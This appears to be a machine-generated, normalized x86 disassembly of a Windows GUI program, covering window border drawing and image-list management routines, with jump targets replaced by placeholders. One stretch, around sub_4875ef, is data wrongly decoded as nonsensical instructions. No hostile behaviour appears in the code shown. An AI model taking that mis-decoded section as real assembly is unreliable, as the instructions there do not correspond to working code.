and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_487188
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
movzx edx [ esp + 0x8 ]
mov eax ebx
call sub_485d44
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
add esp 0xc
pop edi
pop esi
pop ebx
retn
sub_4871c8
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call GetWindowLongW
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call GetWindowRect
mov ecx [ ebp - 0x24 ]
neg ecx
mov edx [ ebp - 0x28 ]
neg edx
lea eax [ ebp - 0x28 ]
call sub_40ac74
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_48731e
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_486220
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_485f18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call GetWindowLongW
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_40ab90
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_487348
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
call sub_485c78
call sub_485d84
test al al
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov al 0x1
call sub_485c78
call sub_485d84
test al al
je r-xdata
mov eax [ ebx + 0x34 ]
call sub_485c0c
test al al
je r-xdata
sub_487394
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4873d9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4873e0
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax rw-data
call j_sub_4068a0
mov eax [ rw-data ]
call sub_4055f0
sub_4875ef
add [ ebx ] al
or [ edx + edx * 2 + 0x65 ] dl
jae r-xdata
add [ ebx ] al
or eax 0x616f4c54
jns r-xdata
dec eax
jne r-xdata
insb
jb r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah ch
jne r-xdata
imul esi [ edi + eax + 0x63 ] 0x42363164
jne r-xdata
dec esp
outsd
popad
push edx
arpl [ ebp + 0x1 ] sp
add [ eax ] al
add [ eax ] al
add eax 0x48000000
jbe r-xdata
outsd
outsb
outsd
inc ebx
push 0x656d6f72
popa
jne r-xdata
push edx
jae r-xdata
push esp
dec esp
outsd
popad
add [ eax ] cl
jb r-xdata
call 0x1848bba6
add al [ eax ]
mov eax eax
imul esi [ edi + eax + 0x63 ] 0x42343264
xor [ esi ] esi
arpl [ ebp + 0x73 ] sp
add [ eax + 0x76 ] ecx
dec eax
add [ edx ] al
add [ eax + r-xdata ] dl
add [ ebx ] ecx
push esp
dec ecx
insd
dec ebp
add [ esi ] cl
add [ eax ] al
add [ esi ] al
popad
dec ecx
add al [ eax ]
nop
in al 0x76
dec eax
add [ ecx ] al
or edx [ ecx + ecx * 2 + 0x6d ]
je r-xdata
jne r-xdata
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x74720870
inc ebx
jne r-xdata
int 0x43
add [ esi + eax * 8 - 0x3963ffbd ] ah
inc ebx
add [ eax ] ah
int 0x43
add [ eax - 0x76 ] al
dec eax
add ah bh

add ah ah
lahf
dec eax
add [ esi + eax * 8 - 0x3ad3ffbd ] al
inc ebx
add [ edi + 0x79 ] dh
add [ eax ] al
add [ eax + 0x7fffffff ] al
shl [ edi + 0x48 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x87
dec eax
add [ eax ] cl
js r-xdata
imul esi [ ebx + 0x74 ] 0xc08b0002
add [ ecx ] cl
arpl [ esp + eax * 2 + 0x65 ] sp
popa
jne r-xdata
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xc8900002
jbe r-xdata
outsd
insd
pop es
outsd
insb
outsd
jb r-xdata
outsb
js r-xdata
dec ecx
je r-xdata
inc esi
jae r-xdata
inc ebx
add [ eax ] bl
add [ eax * 8 - 0x396bffbd ] ch
inc ebx
add al ch
leave
add bl cl
jpe r-xdata
imul esi [ edi + eax + 0x63 ] 0x42323364
imul esi [ edi + eax + 0x49 ] 0x694c676d
jae r-xdata
arpl [ edx + esi + 0x34 ] sp
inc edx
jo r-xdata
add [ eax - 0x53ffbd33 ] dh
je r-xdata
jb r-xdata
or ch [ edx + esi * 2 + 0x46 ]
insb
jb r-xdata
imul edi [ edx + 0x65 ] 0x46726c0a
add al [ eax ]
add [ edi + 0x48 ] dh
insd
inc esi
imul ebp [ ebp + 0xd ] 0x614d726c
jb r-xdata
jb r-xdata
add [ esi + eax * 8 - 0x3617ffbd ] dl
add [ eax + eax ] bh
ja r-xdata
add [ esi ] al
add [ eax ] al
add ah bh
push 0x1
push es
arpl [ esp + eax * 2 + 0x65 ] sp
jbe r-xdata
jae r-xdata
popa
push esp
inc esp
inc ebx
outsd
insb
outsd
jb r-xdata
jae r-xdata
push edx
pop es
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xc08b0002
xor [ esi + 0x48 ] dh
add [ ecx ] al
or [ edi + ecx * 2 + 0x76 ] dl
jb r-xdata
jb r-xdata
add [ eax + 0x680048aa ] bh
stosd [ edi ]
dec eax
add [ eax + 0x48a1 ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] dl
add [ eax ] al
pushfd
adc [ eax ] al
xor al 0x0
add [ eax ] al
pop es
inc esi
dec eax
imul esp [ gs : edi + 0x68 ] 0x274
pushfd
adc [ eax ] al
cmp [ eax ] al
add [ eax ] al
push es
inc esi
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0x9c000002
adc [ eax ] al
cmp al 0x0
add [ eax ] al
or [ esi + 0x41 ] al
insb
insb
outsd
arpl [ edx + 0x79 ] ax
add al [ eax ]
add al bh
adc [ eax ] al
inc eax
add [ eax ] al
add [ edi ] al
inc esi
dec eax
popad
outsb
insb
add al [ gs : eax ]
add [ eax + 0x75 ] ah
dec eax
add [ eax + eax ] al
add [ 0x61724446 ] cl
ja r-xdata
dec eax
add bl al
jpe r-xdata
pop es
inc edx
arpl [ ecx + esi + 0x36 ] sp
push esi
lodsb [ esi ]
arpl [ ebp + 0x44 ] sp
jo r-xdata
je r-xdata
push cs
add al [ eax ]
nop
enter 0x4876 0x0
push es
or eax 0x7254726c
popad
outsb
jae r-xdata
popad
jns r-xdata
jo r-xdata
or eax 0x614d726c
dec ecx
arpl [ edi + 0x6e ] bp
inc edx
insb
outsb
inc ebx
outsd
insb
outsd
jb r-xdata
outsb
push ebx
je r-xdata
inc eax
add [ esi + edx * 2 + 0x58b80040 ] dh
inc eax
add al dh
int3
outsb
outsb
push es
arpl [ eax + edi + 0x42 ] sp
arpl [ esp + esi + 0x42 ] sp
imul esi [ esi + eax + 0x63 ] 0x69423864
je r-xdata
jbe r-xdata
popad
jb r-xdata
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edx ] al
add [ ebp + 0x764c0040 ] cl
dec eax
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add al [ eax ]
lea eax [ eax ]
dec esp
jbe r-xdata
fcomp [ edx + 0x42 ]
add [ eax ] dl
add [ eax ] al
add [ eax ] al
or [ esi + 0x43 ] al
insb
imul esp [ ebp + 0x6e ] 0x27374
insb
add al [ gs : eax ]
add [ eax ] al
adc [ eax ] al
inc ebp
add [ eax ] al
add [ edi ] al
inc esi
dec ebp
popad
jae r-xdata
outsb
je r-xdata
dec ebp
popad
push esp
jns r-xdata
inc esp
add [ eax ] bl
add [ eax ] al
or eax [ esi + 0x4d ]
outsd
outsb
outsd
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x270
add [ eax ] dl
inc eax
outsb
je r-xdata
add al [ fs : eax ]
add [ eax ] al
adc [ eax ] al
inc esi
add [ eax ] al
add [ esi + eax * 2 ] cl
push ebx
push 0x49657261
insd
popad
jae r-xdata
pop es
insb
jb r-xdata
add [ eax + eax ] bl
add [ eax ] cl
inc esi
inc ebx
push 0x65676e61
add al [ fs : eax ]
add [ eax + edx + 0x600040 ] bl
add [ eax ] al
or al 0x46
push ebp
jo r-xdata
add al [ gs : eax ]
add [ eax + 0x67 ] bl
inc esp
add [ eax ] cl
add [ eax ] al
or [ esi + 0x42 ] al
imul eax [ ebx + 0x6f ] 0x6c
outsd
jb r-xdata
dec eax
add [ edx ] al
popad
je r-xdata
add [ eax ] al
add [ ebx ] cl
inc esi
inc ebx
add [ eax - 0x5d ] bh
inc esp
add [ eax + eax ] dl
add [ edi ] al
inc esi
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x270
js r-xdata
add al [ eax ]
mov ah 0x75
dec eax
add [ edi ] al
add [ eax ] al
or al [ esi + 0x49 ]
insd
popad
add [ eax ] al
ja r-xdata
pop eax
inc esp
add [ eax + eax ] cl
add [ ebx ] cl
inc esi
add [ eax ] al
hlt
inc ebx
outsd
jne r-xdata
dec eax
jo r-xdata
add [ ebx ] al
or edx [ ebx + eax * 2 + 0x6f ]
insb
outsd
jb r-xdata
add [ edx ] al
hlt
je r-xdata
add ah dh
push 0x2
sub [ eax ] eax
fdivr [ edx + 0x48 ]
add [ eax + eax + 0xb ] cl
add [ edx ] dl
jpo r-xdata
aam 0x46
inc edx
add [ eax ] ch
add [ eax ] al
or [ esi + 0x4f ] eax
outsb
inc ebx
push 0x65676e61
add al [ eax ]
add ah bh
jbe r-xdata
add [ eax ] al
add [ edx ] al
hlt
add [ eax + eax - 0xc ] al
[ ebp + 0x7b ]
dec eax
add [ ebp ] cl
jl r-xdata
outsd
insb
outsd
jb r-xdata
add [ eax ] dh
add [ eax ] al
or eax [ esi + 0x43 ]
add [ edx ] al
hlt
add [ edx ] al
hlt
sub_488a40
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43c14c
mov [ esi + 0x38 ] 0x10
mov [ esi + 0x34 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_488a8c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor ecx ecx
xor edx edx
mov eax edi
call sub_43c14c
mov [ edi + 0x38 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x34 ] eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x38 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_488ae0
push ebx
push esi
push edi
call sub_405bb4
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_4306d0
mov edx eax
mov eax edi
call sub_48a414
mov eax [ edi + 0x54 ]
call sub_4055f0
mov eax edi
call sub_488e3c
mov eax [ edi + 0x50 ]
call sub_4055f0
xor eax eax
mov [ edi + 0x50 ] eax
mov eax [ edi + 0x58 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_43c198
test bl bl
jle r-xdata
call sub_4055f0
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_405b5c
sub_488b4c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_488bfd
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebx + 0x50 ] eax
mov eax [ ebx + 0x34 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x38 ] 0x1
jge r-xdata
mov [ ebx + 0x3c ] 0x4
mov [ ebx + 0x45 ] 0x1
mov dl 0x2
mov eax ebx
call sub_48a170
mov [ ebx + 0x47 ] 0x0
mov [ ebx + 0x48 ] 0x1fffffff
mov [ ebx + 0x4c ] 0x1fffffff
mov [ ebx + 0x70 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_450824
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_488c1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488c04
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_488c1c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_488cbd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_4520c4
mov eax ebx
call sub_451144
mov eax [ eax + 0x48 ]
xor edx edx
call sub_44cd1c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
mov ecx eax
xor edx edx
xor eax eax
call sub_42e1b0
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_451144
pop edx
mov ecx [ eax ]
call [ ecx + 0x4c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488cc4
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_488ce0
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x38 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x34 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x38 ] eax
mov eax [ esp ]
mov [ ebx + 0x34 ] eax
mov eax ebx
call sub_488c1c
pop ecx
pop edx
pop ebx
retn
sub_488d24
push esi
mov esi eax
cmp edx [ esi + 0x38 ]
je r-xdata
pop esi
retn
mov ecx edx
mov [ esi + 0x38 ] ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov eax esi
call sub_489738
mov eax esi
call sub_488c1c
mov eax esi
mov si 0xfff0
call sub_40587c
mov edx [ esi + 0x34 ]
push edx
push ecx
push eax
call ImageList_SetIconSize
sub_488d60
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
retn
mov ecx edx
mov [ esi + 0x34 ] ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov eax esi
call sub_489738
mov eax esi
call sub_488c1c
mov eax esi
mov si 0xfff0
call sub_40587c
push ecx
mov edx [ esi + 0x38 ]
push edx
push eax
call ImageList_SetIconSize
sub_488d9c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_488e3c
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_488ce0
mov [ ebx + 0x40 ] esi
mov eax ebx
mov si 0xfff0
call sub_40587c
sub_488de8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_48a0f8
test esi esi
je r-xdata
mov eax [ ebx + 0x54 ]
mov edx [ eax ]
call [ edx + 0x70 ]
mov eax esi
call sub_4511c4
cmp al 0x1
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x78 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x70 ]
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x70 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_488e3c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x40 ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax ebx
mov si 0xfff0
call sub_40587c
pop esi
pop ebx
retn
cmp [ ebx + 0x46 ] 0x0
jne r-xdata
mov eax ebx
call sub_488dd8
push eax
call ImageList_Destroy
sub_488e6c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_488f00
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x3c ]
push esi
push esi
movzx eax [ ebx + 0x70 ]
mov eax [ eax * 4 + rw-data ]
movzx edx [ ebx + 0x45 ]
or eax [ edx * 4 + rw-data ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call ImageList_Create
mov edi eax
mov [ ebx + 0x40 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x48 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488f07
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov edx eax
mov eax ebx
call sub_489744
sub_488f10
push ebx
add esp 0xffffffe0
mov ebx eax
mov eax ebx
call sub_4892a4
test eax eax
jle r-xdata
xor ebx ebx
push esp
push 0x0
mov eax ebx
call sub_488dd8
push eax
call ImageList_GetImageInfo
test eax eax
je r-xdata
mov ebx [ esp ]
mov eax [ esp + 0x4 ]
push eax
call DeleteObject
jmp r-xdata
mov eax ebx
add esp 0x20
pop ebx
retn
sub_488f50
push ebx
add esp 0xffffffe0
mov ebx eax
mov eax ebx
call sub_4892a4
test eax eax
jle r-xdata
xor ebx ebx
push esp
push 0x0
mov eax ebx
call sub_488dd8
push eax
call ImageList_GetImageInfo
test eax eax
je r-xdata
mov ebx [ esp + 0x4 ]
mov eax [ esp ]
push eax
call DeleteObject
jmp r-xdata
mov eax ebx
add esp 0x20
pop ebx
retn
sub_488f90
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_450824
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_48903f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_450824
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_489022
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_488c10
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_488de8
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_488de8
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489029
mov eax [ ebp - 0x10 ]
call sub_4055f0
retn
sub_48905c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_450824
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_48915b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x45 ] 0x0
je r-xdata
push 0x0
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_488de8
push eax
mov eax [ ebp - 0x4 ]
call sub_488dd8
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489162
mov eax [ ebp - 0xc ]
call sub_4055f0
retn
cmp esi 0xffffffff
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_450824
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_48911d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx esi
mov eax [ ebp - 0x10 ]
call sub_4525a0
mov eax [ ebp - 0x4 ]
call sub_488c10
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x74 ]
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_488dc8
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_488de8
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4055f0
retn
sub_489178
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov edx esi
mov eax ebx
call sub_48a0f8
mov eax ebx
call sub_488dd8
mov edi eax
mov eax esi
call sub_452f10
push eax
push 0xffffffff
push edi
call ImageList_ReplaceIcon
mov edi eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_488f90
mov edi eax
jmp r-xdata
mov eax ebx
mov si 0xfff0
call sub_40587c
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_4891c8
push ebx
push esi
push edi
push ecx
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
je r-xdata
xor eax eax
cmp [ edi + 0x40 ] 0x0
setne al
jmp r-xdata
xor eax eax
cmp [ esp ] 0xffffffff
setg al
jmp r-xdata
test al al
je r-xdata
xor eax eax
mov eax edi
call sub_4892a4
cmp eax [ esp ]
setg al
jmp r-xdata
test al al
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov edx [ edi + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx [ edi + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
mov eax [ esp + 0x4 ]
push eax
push 0x1
mov eax esi
call sub_451144
mov edx eax
xor ecx ecx
mov eax edi
call sub_4899c8
mov ebx eax
test bl bl
je r-xdata
sub_489258
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0x40 ] 0x0
je r-xdata
movzx eax [ ebp + 0xc ]
mov eax [ eax * 4 + rw-data ]
movzx edx [ ebp + 0x8 ]
or eax [ edx * 4 + rw-data ]
push eax
push edi
mov eax ebx
call sub_488dd8
push eax
call ImageList_GetIcon
mov edx eax
mov eax esi
call sub_453268
sub_4892a4
push ebx
mov ebx eax
cmp [ ebx + 0x40 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_488dd8
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_4892c0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4893d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_450824
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4893a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_450824
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_48938c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489393
mov eax [ ebp - 0xc ]
call sub_4055f0
retn
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_488de8
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_488de8
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_488dd8
push eax
call ImageList_Replace
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
sub_4893e4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4895f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff0
call sub_40587c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4895ff
lea eax [ ebp - 0x18 ]
mov edx 0x2
call j_sub_4068c4
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_48a0f8
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_48905c
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
xor eax eax
push ebp
push sub_4895a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_450824
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_489589
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_450824
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_48956c
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_4522e8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
